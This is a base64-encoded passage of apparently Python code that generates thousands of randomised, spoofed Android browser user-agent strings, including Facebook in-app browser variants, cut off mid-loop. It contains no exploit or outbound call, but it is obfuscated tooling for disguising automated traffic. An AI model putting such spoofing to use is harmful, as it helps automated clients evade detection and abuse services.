4wIChMaW51eDsgVTsgQW5kcm9pZCddKSAKICAgIGI9IHN0cihyYW5kb20ucmFuZHJhbmdlKDEsIDE0KSkrJy4nK3N0cihyYW5kb20ucmFuZHJhbmdlKDAsNikpKycuJytzdHIocmFuZG9tLnJhbmRyYW5nZSgwLCA2KSkgCiAgICBjPSdNb3RvRzMgQnVpbGQvTVBJUzI0LjEwNy01NS0yLTE3OyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLycKICAgIGQ9c3RyKHJhbmRvbS5yYW5kcmFuZ2UoMjAsIDI3NSkpKycuMC4nK3N0cihyYW5kb20ucmFuZHJhbmdlKDMwLCA3MDAwKSkrJy4nK3N0cihyYW5kb20ucmFuZHJhbmdlKDIwLCAyNzUpKSAKICAgIGU9cmFuZG9tLmNob2ljZShbJ01vYmlsZSBTYWZhcmkvNTM3LjM2JywgJ01vYmlsZSBTYWZhcmkvNTM3LjM2IFtGQl9JQUIvRkI0QTtGQkFWLzM1Mi4wLjAuMjEuMTE3O10nLCAnTW9iaWxlIFNhZmFyaS81MzcuMzYgWWFBcHBfQW5kcm9pZC85Ljc1IFlhU2VhcmNoQnJvd3Nlci85Ljc1JywgJ01vYmlsZSBTYWZhcmkvNTM3LjM2IEFsb2hhQnJvd3Nlci8zLjkuMycsICdVQ0Jyb3dzZXIvMTIuMTMuNC4xMjE0IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywgJ01vYmlsZSBTYWZhcmkvNTM3LjM2IE9QWC8xLjEnLCAnTW9iaWxlIFNhZmFyaS81MzcuMzZbRkJBTi9FTUE7RkJMQy9wdF9CUjtGQkFWLzI2OS4wLjAuOC4xMTg7XScsICdNb2JpbGUgU2FmYXJpLzUzNy4zNiBPUFIvNTMuMC4yNTY5LjE0MTExNycsICdNb2JpbGUgU2FmYXJpLzUzNy4zNiBQVFNULzIwMDgwNC4xNTA4MjgnLCAnTW9iaWxlIFNhZmFyaS81MzcuMzYgVGFwYXRhbGsvOC4xLjcnLCAnU2FmYXJpLzUzNC4zMCddKSAKICAgIHVzYW09Zid7YX0ge2J9OyB7Y317ZH0ge2V9JwogICAgdWdlbi5hcHBlbmQodXNhbSkKCiAgICBhID1yYW5kb20uY2hvaWNlKFsnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkJywgJ01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCddKSAKICAgIGI9IHN0cihyYW5kb20ucmFuZHJhbmdlKDEsIDE0KSkrJy4nK3N0cihyYW5kb20ucmFuZHJhbmdlKDAsNikpKycuJytzdHIocmFuZG9tLnJhbmRyYW5nZSgwLCA2KSkgCiAgICBjPSdNb3RvIEcgKDUpIFBsdXMgQnVpbGQvTlBOUzI1LjEzNy0zNS01KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvJwogICAgZD1zdHIocmFuZG9tLnJhbmRyYW5nZSgyMCwgMjc1KSkrJy4wLicrc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMzAsIDcwMDApKSsnLicrc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMjAsIDI3NSkpIAogICAgZT1yYW5kb20uY2hvaWNlKFsnTW9iaWxlIFNhZmFyaS81MzcuMzYnLCAnTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCX0lBQi9GQjRBO0ZCQVYvMzUyLjAuMC4yMS4xMTc7XScsICdNb2JpbGUgU2FmYXJpLzUzNy4zNiBZYUFwcF9BbmRyb2lkLzkuNzUgWWFTZWFyY2hCcm93c2VyLzkuNzUnLCAnTW9iaWxlIFNhZmFyaS81MzcuMzYgQWxvaGFCcm93c2VyLzMuOS4zJywgJ1VDQnJvd3Nlci8xMi4xMy40LjEyMTQgTW9iaWxlIFNhZmFyaS81MzcuMzYnLCAnTW9iaWxlIFNhZmFyaS81MzcuMzYgT1BYLzEuMScsICdNb2JpbGUgU2FmYXJpLzUzNy4zNltGQkFOL0VNQTtGQkxDL3B0X0JSO0ZCQVYvMjY5LjAuMC44LjExODtdJywgJ01vYmlsZSBTYWZhcmkvNTM3LjM2IE9QUi81My4wLjI1NjkuMTQxMTE3JywgJ01vYmlsZSBTYWZhcmkvNTM3LjM2IFBUU1QvMjAwODA0LjE1MDgyOCcsICdNb2JpbGUgU2FmYXJpLzUzNy4zNiBUYXBhdGFsay84LjEuNycsICdTYWZhcmkvNTM0LjMwJ10pIAogICAgdXNhbT1mJ3thfSB7Yn07IHtjfXtkfSB7ZX0nCiAgICB1Z2VuLmFwcGVuZCh1c2FtKQoKICAgIGEgPXJhbmRvbS5jaG9pY2UoWydNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQnLCAnTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkJ10pIAogICAgYj0gc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMSwgMTQpKSsnLicrc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMCw2KSkrJy4nK3N0cihyYW5kb20ucmFuZHJhbmdlKDAsIDYpKSAKICAgIGM9J01vdG9HMyBCdWlsZC9NUElTMjQuMTA3LTU1LTItMTc7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvJwogICAgZD1zdHIocmFuZG9tLnJhbmRyYW5nZSgyMCwgMjc1KSkrJy4wLicrc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMzAsIDcwMDApKSsnLicrc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMjAsIDI3NSkpIAogICAgZT1yYW5kb20uY2hvaWNlKFsnTW9iaWxlIFNhZmFyaS81MzcuMzYnLCAnTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCX0lBQi9GQjRBO0ZCQVYvMzUyLjAuMC4yMS4xMTc7XScsICdNb2JpbGUgU2FmYXJpLzUzNy4zNiBZYUFwcF9BbmRyb2lkLzkuNzUgWWFTZWFyY2hCcm93c2VyLzkuNzUnLCAnTW9iaWxlIFNhZmFyaS81MzcuMzYgQWxvaGFCcm93c2VyLzMuOS4zJywgJ1VDQnJvd3Nlci8xMi4xMy40LjEyMTQgTW9iaWxlIFNhZmFyaS81MzcuMzYnLCAnTW9iaWxlIFNhZmFyaS81MzcuMzYgT1BYLzEuMScsICdNb2JpbGUgU2FmYXJpLzUzNy4zNltGQkFOL0VNQTtGQkxDL3B0X0JSO0ZCQVYvMjY5LjAuMC44LjExODtdJywgJ01vYmlsZSBTYWZhcmkvNTM3LjM2IE9QUi81My4wLjI1NjkuMTQxMTE3JywgJ01vYmlsZSBTYWZhcmkvNTM3LjM2IFBUU1QvMjAwODA0LjE1MDgyOCcsICdNb2JpbGUgU2FmYXJpLzUzNy4zNiBUYXBhdGFsay84LjEuNycsICdTYWZhcmkvNTM0LjMwJ10pIAogICAgdXNhbT1mJ3thfSB7Yn07IHtjfXtkfSB7ZX0nCiAgICB1Z2VuLmFwcGVuZCh1c2FtKQoKICAgIGEgPXJhbmRvbS5jaG9pY2UoWydNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQnLCAnTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkJ10pIAogICAgYj0gc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMSwgMTQpKSsnLicrc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMCw2KSkrJy4nK3N0cihyYW5kb20ucmFuZHJhbmdlKDAsIDYpKSAKICAgIGM9J01vdG8gRSAoNCkgUGx1cyBCdWlsZC9OTUEyNi40Mi01NikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLycKICAgIGQ9c3RyKHJhbmRvbS5yYW5kcmFuZ2UoMjAsIDI3NSkpKycuMC4nK3N0cihyYW5kb20ucmFuZHJhbmdlKDMwLCA3MDAwKSkrJy4nK3N0cihyYW5kb20ucmFuZHJhbmdlKDIwLCAyNzUpKSAKICAgIGU9cmFuZG9tLmNob2ljZShbJ01vYmlsZSBTYWZhcmkvNTM3LjM2JywgJ01vYmlsZSBTYWZhcmkvNTM3LjM2IFtGQl9JQUIvRkI0QTtGQkFWLzM1Mi4wLjAuMjEuMTE3O10nLCAnTW9iaWxlIFNhZmFyaS81MzcuMzYgWWFBcHBfQW5kcm9pZC85Ljc1IFlhU2VhcmNoQnJvd3Nlci85Ljc1JywgJ01vYmlsZSBTYWZhcmkvNTM3LjM2IEFsb2hhQnJvd3Nlci8zLjkuMycsICdVQ0Jyb3dzZXIvMTIuMTMuNC4xMjE0IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywgJ01vYmlsZSBTYWZhcmkvNTM3LjM2IE9QWC8xLjEnLCAnTW9iaWxlIFNhZmFyaS81MzcuMzZbRkJBTi9FTUE7RkJMQy9wdF9CUjtGQkFWLzI2OS4wLjAuOC4xMTg7XScsICdNb2JpbGUgU2FmYXJpLzUzNy4zNiBPUFIvNTMuMC4yNTY5LjE0MTExNycsICdNb2JpbGUgU2FmYXJpLzUzNy4zNiBQVFNULzIwMDgwNC4xNTA4MjgnLCAnTW9iaWxlIFNhZmFyaS81MzcuMzYgVGFwYXRhbGsvOC4xLjcnLCAnU2FmYXJpLzUzNC4zMCddKSAKICAgIHVzYW09Zid7YX0ge2J9OyB7Y317ZH0ge2V9JwogICAgdWdlbi5hcHBlbmQodXNhbSkKCiAgICBhID1yYW5kb20uY2hvaWNlKFsnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkJywgJ01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCddKSAKICAgIGI9IHN0cihyYW5kb20ucmFuZHJhbmdlKDEsIDE0KSkrJy4nK3N0cihyYW5kb20ucmFuZHJhbmdlKDAsNikpKycuJytzdHIocmFuZG9tLnJhbmRyYW5nZSgwLCA2KSkgCiAgICBjPSdNb3RvRzMgQnVpbGQvTVBJUzI0LjEwNy01NS0yLTE3OyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLycKICAgIGQ9c3RyKHJhbmRvbS5yYW5kcmFuZ2UoMjAsIDI3NSkpKycuMC4nK3N0cihyYW5kb20ucmFuZHJhbmdlKDMwLCA3MDAwKSkrJy4nK3N0cihyYW5kb20ucmFuZHJhbmdlKDIwLCAyNzUpKSAKICAgIGU9cmFuZG9tLmNob2ljZShbJ01vYmlsZSBTYWZhcmkvNTM3LjM2JywgJ01vYmlsZSBTYWZhcmkvNTM3LjM2IFtGQl9JQUIvRkI0QTtGQkFWLzM1Mi4wLjAuMjEuMTE3O10nLCAnTW9iaWxlIFNhZmFyaS81MzcuMzYgWWFBcHBfQW5kcm9pZC85Ljc1IFlhU2VhcmNoQnJvd3Nlci85Ljc1JywgJ01vYmlsZSBTYWZhcmkvNTM3LjM2IEFsb2hhQnJvd3Nlci8zLjkuMycsICdVQ0Jyb3dzZXIvMTIuMTMuNC4xMjE0IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywgJ01vYmlsZSBTYWZhcmkvNTM3LjM2IE9QWC8xLjEnLCAnTW9iaWxlIFNhZmFyaS81MzcuMzZbRkJBTi9FTUE7RkJMQy9wdF9CUjtGQkFWLzI2OS4wLjAuOC4xMTg7XScsICdNb2JpbGUgU2FmYXJpLzUzNy4zNiBPUFIvNTMuMC4yNTY5LjE0MTExNycsICdNb2JpbGUgU2FmYXJpLzUzNy4zNiBQVFNULzIwMDgwNC4xNTA4MjgnLCAnTW9iaWxlIFNhZmFyaS81MzcuMzYgVGFwYXRhbGsvOC4xLjcnLCAnU2FmYXJpLzUzNC4zMCddKSAKICAgIHVzYW09Zid7YX0ge2J9OyB7Y317ZH0ge2V9JwogICAgdWdlbi5hcHBlbmQodXNhbSkKCiAgICBhID1yYW5kb20uY2hvaWNlKFsnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkJywgJ01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCddKSAKICAgIGI9IHN0cihyYW5kb20ucmFuZHJhbmdlKDEsIDE0KSkrJy4nK3N0cihyYW5kb20ucmFuZHJhbmdlKDAsNikpKycuJytzdHIocmFuZG9tLnJhbmRyYW5nZSgwLCA2KSkgCiAgICBjPSdNb3RvIEUgKDQpIFBsdXMgQnVpbGQvTk1BMjYuNDItNTYpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8nCiAgICBkPXN0cihyYW5kb20ucmFuZHJhbmdlKDIwLCAyNzUpKSsnLjAuJytzdHIocmFuZG9tLnJhbmRyYW5nZSgzMCwgNzAwMCkpKycuJytzdHIocmFuZG9tLnJhbmRyYW5nZSgyMCwgMjc1KSkgCiAgICBlPXJhbmRvbS5jaG9pY2UoWydNb2JpbGUgU2FmYXJpLzUzNy4zNicsICdNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJfSUFCL0ZCNEE7RkJBVi8zNTIuMC4wLjIxLjExNztdJywgJ01vYmlsZSBTYWZhcmkvNTM3LjM2IFlhQXBwX0FuZHJvaWQvOS43NSBZYVNlYXJjaEJyb3dzZXIvOS43NScsICdNb2JpbGUgU2FmYXJpLzUzNy4zNiBBbG9oYUJyb3dzZXIvMy45LjMnLCAnVUNCcm93c2VyLzEyLjEzLjQuMTIxNCBNb2JpbGUgU2FmYXJpLzUzNy4zNicsICdNb2JpbGUgU2FmYXJpLzUzNy4zNiBPUFgvMS4xJywgJ01vYmlsZSBTYWZhcmkvNTM3LjM2W0ZCQU4vRU1BO0ZCTEMvcHRfQlI7RkJBVi8yNjkuMC4wLjguMTE4O10nLCAnTW9iaWxlIFNhZmFyaS81MzcuMzYgT1BSLzUzLjAuMjU2OS4xNDExMTcnLCAnTW9iaWxlIFNhZmFyaS81MzcuMzYgUFRTVC8yMDA4MDQuMTUwODI4JywgJ01vYmlsZSBTYWZhcmkvNTM3LjM2IFRhcGF0YWxrLzguMS43JywgJ1NhZmFyaS81MzQuMzAnXSkgCiAgICB1c2FtPWYne2F9IHtifTsge2N9e2R9IHtlfScKICAgIHVnZW4uYXBwZW5kKHVzYW0pCgogICAgYSA9cmFuZG9tLmNob2ljZShbJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCcsICdNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQnXSkgCiAgICBiPSBzdHIocmFuZG9tLnJhbmRyYW5nZSgxLCAxNCkpKycuJytzdHIocmFuZG9tLnJhbmRyYW5nZSgwLDYpKSsnLicrc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMCwgNikpIAogICAgYz0nTW90byBHICg1UykgUGx1cyBCdWlsZC9OUFMyNi4xMTYtNTEpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8nCiAgICBkPXN0cihyYW5kb20ucmFuZHJhbmdlKDIwLCAyNzUpKSsnLjAuJytzdHIocmFuZG9tLnJhbmRyYW5nZSgzMCwgNzAwMCkpKycuJytzdHIocmFuZG9tLnJhbmRyYW5nZSgyMCwgMjc1KSkgCiAgICBlPXJhbmRvbS5jaG9pY2UoWydNb2JpbGUgU2FmYXJpLzUzNy4zNicsICdNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJfSUFCL0ZCNEE7RkJBVi8zNTIuMC4wLjIxLjExNztdJywgJ01vYmlsZSBTYWZhcmkvNTM3LjM2IFlhQXBwX0FuZHJvaWQvOS43NSBZYVNlYXJjaEJyb3dzZXIvOS43NScsICdNb2JpbGUgU2FmYXJpLzUzNy4zNiBBbG9oYUJyb3dzZXIvMy45LjMnLCAnVUNCcm93c2VyLzEyLjEzLjQuMTIxNCBNb2JpbGUgU2FmYXJpLzUzNy4zNicsICdNb2JpbGUgU2FmYXJpLzUzNy4zNiBPUFgvMS4xJywgJ01vYmlsZSBTYWZhcmkvNTM3LjM2W0ZCQU4vRU1BO0ZCTEMvcHRfQlI7RkJBVi8yNjkuMC4wLjguMTE4O10nLCAnTW9iaWxlIFNhZmFyaS81MzcuMzYgT1BSLzUzLjAuMjU2OS4xNDExMTcnLCAnTW9iaWxlIFNhZmFyaS81MzcuMzYgUFRTVC8yMDA4MDQuMTUwODI4JywgJ01vYmlsZSBTYWZhcmkvNTM3LjM2IFRhcGF0YWxrLzguMS43JywgJ1NhZmFyaS81MzQuMzAnXSkgCiAgICB1c2FtPWYne2F9IHtifTsge2N9e2R9IHtlfScKICAgIHVnZW4uYXBwZW5kKHVzYW0pCgogICAgYSA9cmFuZG9tLmNob2ljZShbJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCcsICdNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQnXSkgCiAgICBiPSBzdHIocmFuZG9tLnJhbmRyYW5nZSgxLCAxNCkpKycuJytzdHIocmFuZG9tLnJhbmRyYW5nZSgwLDYpKSsnLicrc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMCwgNikpIAogICAgYz0nWFQxMDY4IEJ1aWxkL0xYQjIyLjQ2LTI4KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvJwogICAgZD1zdHIocmFuZG9tLnJhbmRyYW5nZSgyMCwgMjc1KSkrJy4wLicrc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMzAsIDcwMDApKSsnLicrc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMjAsIDI3NSkpIAogICAgZT1yYW5kb20uY2hvaWNlKFsnTW9iaWxlIFNhZmFyaS81MzcuMzYnLCAnTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCX0lBQi9GQjRBO0ZCQVYvMzUyLjAuMC4yMS4xMTc7XScsICdNb2JpbGUgU2FmYXJpLzUzNy4zNiBZYUFwcF9BbmRyb2lkLzkuNzUgWWFTZWFyY2hCcm93c2VyLzkuNzUnLCAnTW9iaWxlIFNhZmFyaS81MzcuMzYgQWxvaGFCcm93c2VyLzMuOS4zJywgJ1VDQnJvd3Nlci8xMi4xMy40LjEyMTQgTW9iaWxlIFNhZmFyaS81MzcuMzYnLCAnTW9iaWxlIFNhZmFyaS81MzcuMzYgT1BYLzEuMScsICdNb2JpbGUgU2FmYXJpLzUzNy4zNltGQkFOL0VNQTtGQkxDL3B0X0JSO0ZCQVYvMjY5LjAuMC44LjExODtdJywgJ01vYmlsZSBTYWZhcmkvNTM3LjM2IE9QUi81My4wLjI1NjkuMTQxMTE3JywgJ01vYmlsZSBTYWZhcmkvNTM3LjM2IFBUU1QvMjAwODA0LjE1MDgyOCcsICdNb2JpbGUgU2FmYXJpLzUzNy4zNiBUYXBhdGFsay84LjEuNycsICdTYWZhcmkvNTM0LjMwJ10pIAogICAgdXNhbT1mJ3thfSB7Yn07IHtjfXtkfSB7ZX0nCiAgICB1Z2VuLmFwcGVuZCh1c2FtKQoKICAgIGEgPXJhbmRvbS5jaG9pY2UoWydNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQnLCAnTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkJ10pIAogICAgYj0gc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMSwgMTQpKSsnLicrc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMCw2KSkrJy4nK3N0cihyYW5kb20ucmFuZHJhbmdlKDAsIDYpKSAKICAgIGM9J21vdG8gZTUgQnVpbGQvT1BQUzI3LjkxLTE3Ni0xMS0xNikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLycKICAgIGQ9c3RyKHJhbmRvbS5yYW5kcmFuZ2UoMjAsIDI3NSkpKycuMC4nK3N0cihyYW5kb20ucmFuZHJhbmdlKDMwLCA3MDAwKSkrJy4nK3N0cihyYW5kb20ucmFuZHJhbmdlKDIwLCAyNzUpKSAKICAgIGU9cmFuZG9tLmNob2ljZShbJ01vYmlsZSBTYWZhcmkvNTM3LjM2JywgJ01vYmlsZSBTYWZhcmkvNTM3LjM2IFtGQl9JQUIvRkI0QTtGQkFWLzM1Mi4wLjAuMjEuMTE3O10nLCAnTW9iaWxlIFNhZmFyaS81MzcuMzYgWWFBcHBfQW5kcm9pZC85Ljc1IFlhU2VhcmNoQnJvd3Nlci85Ljc1JywgJ01vYmlsZSBTYWZhcmkvNTM3LjM2IEFsb2hhQnJvd3Nlci8zLjkuMycsICdVQ0Jyb3dzZXIvMTIuMTMuNC4xMjE0IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywgJ01vYmlsZSBTYWZhcmkvNTM3LjM2IE9QWC8xLjEnLCAnTW9iaWxlIFNhZmFyaS81MzcuMzZbRkJBTi9FTUE7RkJMQy9wdF9CUjtGQkFWLzI2OS4wLjAuOC4xMTg7XScsICdNb2JpbGUgU2FmYXJpLzUzNy4zNiBPUFIvNTMuMC4yNTY5LjE0MTExNycsICdNb2JpbGUgU2FmYXJpLzUzNy4zNiBQVFNULzIwMDgwNC4xNTA4MjgnLCAnTW9iaWxlIFNhZmFyaS81MzcuMzYgVGFwYXRhbGsvOC4xLjcnLCAnU2FmYXJpLzUzNC4zMCddKSAKICAgIHVzYW09Zid7YX0ge2J9OyB7Y317ZH0ge2V9JwogICAgdWdlbi5hcHBlbmQodXNhbSkKCiAgICBhPSdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQnCiAgICBiPXJhbmRvbS5yYW5kcmFuZ2UoNiwgMTQpCiAgICBjPSdTTS1BMTA1JwogICAgZD0nQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLycKICAgIGU9c3RyKHJhbmRvbS5yYW5kcmFuZ2UoMTAsIDIxNCkpKycuMC4nK3N0cihyYW5kb20ucmFuZHJhbmdlKDMwMDAsIDcwMDApKSsnLicrc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMTAsIDI3NSkpIAogICAgZj1yYW5kb20uY2hvaWNlKFsnTW9iaWxlIFNhZmFyaS81MzcuMzYnLCAnTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCX0lBQi9GQjRBO0ZCQVYvMzUyLjAuMC4yMS4xMTc7XScsICdNb2JpbGUgU2FmYXJpLzUzNy4zNiBZYUFwcF9BbmRyb2lkLzkuNzUgWWFTZWFyY2hCcm93c2VyLzkuNzUnLCAnTW9iaWxlIFNhZmFyaS81MzcuMzYgQWxvaGFCcm93c2VyLzMuOS4zJywgJ1VDQnJvd3Nlci8xMi4xMy40LjEyMTQgTW9iaWxlIFNhZmFyaS81MzcuMzYnLCAnTW9iaWxlIFNhZmFyaS81MzcuMzYgT1BYLzEuMScsICdNb2JpbGUgU2FmYXJpLzUzNy4zNltGQkFOL0VNQTtGQkxDL3B0X0JSO0ZCQVYvMjY5LjAuMC44LjExODtdJywgJ01vYmlsZSBTYWZhcmkvNTM3LjM2IE9QUi81My4wLjI1NjkuMTQxMTE3JywgJ01vYmlsZSBTYWZhcmkvNTM3LjM2IFBUU1QvMjAwODA0LjE1MDgyOCcsICdNb2JpbGUgU2FmYXJpLzUzNy4zNiBUYXBhdGFsay84LjEuNycsICdTYWZhcmkvNTM0LjMwJ10pIAogICAgZ2Vrbz1mJ3thfSB7Yn07IHtjfSkge2R9e2V9IHtmfScKICAgIHVnZW4uYXBwZW5kKGdla28pCgogICAgYSA9cmFuZG9tLmNob2ljZShbJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCcsICdNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQnXSkgCiAgICBiPSBzdHIocmFuZG9tLnJhbmRyYW5nZSgxLCAxNCkpKycuJytzdHIocmFuZG9tLnJhbmRyYW5nZSgwLDYpKSsnLicrc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMCwgNikpIAogICAgYz0nTW90byBHIFBsYXkgQnVpbGQvTlBJUzI2LjQ4LTQzLTIpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwlMkMgbGlrZSBHZWNrbykgQ2hyb21lLycKICAgIGQ9c3RyKHJhbmRvbS5yYW5kcmFuZ2UoMjAsIDI3NSkpKycuMC4nK3N0cihyYW5kb20ucmFuZHJhbmdlKDMwLCA3MDAwKSkrJy4nK3N0cihyYW5kb20ucmFuZHJhbmdlKDIwLCAyNzUpKSAKICAgIGU9cmFuZG9tLmNob2ljZShbJ01vYmlsZSBTYWZhcmkvNTM3LjM2JywgJ01vYmlsZSBTYWZhcmkvNTM3LjM2IFtGQl9JQUIvRkI0QTtGQkFWLzM1Mi4wLjAuMjEuMTE3O10nLCAnTW9iaWxlIFNhZmFyaS81MzcuMzYgWWFBcHBfQW5kcm9pZC85Ljc1IFlhU2VhcmNoQnJvd3Nlci85Ljc1JywgJ01vYmlsZSBTYWZhcmkvNTM3LjM2IEFsb2hhQnJvd3Nlci8zLjkuMycsICdVQ0Jyb3dzZXIvMTIuMTMuNC4xMjE0IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywgJ01vYmlsZSBTYWZhcmkvNTM3LjM2IE9QWC8xLjEnLCAnTW9iaWxlIFNhZmFyaS81MzcuMzZbRkJBTi9FTUE7RkJMQy9wdF9CUjtGQkFWLzI2OS4wLjAuOC4xMTg7XScsICdNb2JpbGUgU2FmYXJpLzUzNy4zNiBPUFIvNTMuMC4yNTY5LjE0MTExNycsICdNb2JpbGUgU2FmYXJpLzUzNy4zNiBQVFNULzIwMDgwNC4xNTA4MjgnLCAnTW9iaWxlIFNhZmFyaS81MzcuMzYgVGFwYXRhbGsvOC4xLjcnLCAnU2FmYXJpLzUzNC4zMCddKSAKICAgIHVzYW09Zid7YX0ge2J9OyB7Y317ZH0ge2V9JwogICAgdWdlbi5hcHBlbmQodXNhbSkKCiAgICBhPSdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQnCiAgICBiPXJhbmRvbS5yYW5kcmFuZ2UoMSwgMTQpIAogICAgYz0nUk1YJwogICAgZD1zdHIocmFuZG9tLnJhbmRyYW5nZSgxLCA5KSkrc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMSwgOSkpK3N0cihyYW5kb20ucmFuZHJhbmdlKDEsIDkpKStzdHIocmFuZG9tLnJhbmRyYW5nZSgxLCA5KSkgCiAgICBlPSdBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MJTJDIGxpa2UgR2Vja28pIENocm9tZS8nCiAgICBmPXN0cihyYW5kb20ucmFuZHJhbmdlKDIwLCAyNzUpKSsnLjAuJytzdHIocmFuZG9tLnJhbmRyYW5nZSgzMCwgNzAwMCkpKycuJytzdHIocmFuZG9tLnJhbmRyYW5nZSgyMCwgMjc1KSkgCiAgICBnPSdNb2JpbGUgU2FmYXJpLzUzNy4zNicKICAgIHVnYT1mJ3thfSB7Yn07IHtjfXtkfSkge2V9e2Z9IHtnfScKICAgIHVnZW4uYXBwZW5kKHVnYSkKCiAgICBhPSdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQnCiAgICBiPXJhbmRvbS5yYW5kcmFuZ2UoMSwgMTQpIAogICAgYz0nQ1BIJwogICAgZD1zdHIocmFuZG9tLnJhbmRyYW5nZSgxLCA5KSkrc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMSwgOSkpK3N0cihyYW5kb20ucmFuZHJhbmdlKDEsIDkpKStzdHIocmFuZG9tLnJhbmRyYW5nZSgxLCA5KSkgCiAgICBlPSdBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MJTJDIGxpa2UgR2Vja28pIENocm9tZS8nCiAgICBmPXN0cihyYW5kb20ucmFuZHJhbmdlKDIwLCAyNzUpKSsnLjAuJytzdHIocmFuZG9tLnJhbmRyYW5nZSgzMCwgNzAwMCkpKycuJytzdHIocmFuZG9tLnJhbmRyYW5nZSgyMCwgMjc1KSkgCiAgICBnPSdNb2JpbGUgU2FmYXJpLzUzNy4zNicKICAgIHVnYT1mJ3thfSB7Yn07IHtjfXtkfSkge2V9e2Z9IHtnfScKICAgIHVnZW4uYXBwZW5kKHVnYSkKCiAgICBhPSdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQnCiAgICBiPXJhbmRvbS5yYW5kcmFuZ2UoMSwgMTQpIAogICAgYz0ndml2bycKICAgIGQ9c3RyKHJhbmRvbS5yYW5kcmFuZ2UoMSwgOSkpK3N0cihyYW5kb20ucmFuZHJhbmdlKDEsIDkpKStzdHIocmFuZG9tLnJhbmRyYW5nZSgxLCA5KSkrc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMSwgOSkpIAogICAgZT0nQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCUyQyBsaWtlIEdlY2tvKSBDaHJvbWUvJwogICAgZj1zdHIocmFuZG9tLnJhbmRyYW5nZSgyMCwgMjc1KSkrJy4wLicrc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMzAsIDcwMDApKSsnLicrc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMjAsIDI3NSkpIAogICAgZz0nTW9iaWxlIFNhZmFyaS81MzcuMzYnCiAgICB1Z2E9Zid7YX0ge2J9OyB7Y30ge2R9KSB7ZX17Zn0ge2d9JwogICAgdWdlbi5hcHBlbmQodWdhKQpmb3IgYWdlbmt1IGluIHJhbmdlKDEwMDAwKToKICAgIGE9J01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCcKICAgIGI9cmFuZG9tLmNob2ljZShbJzUuMCcsJzYuMCcsJzcuMCcsJzg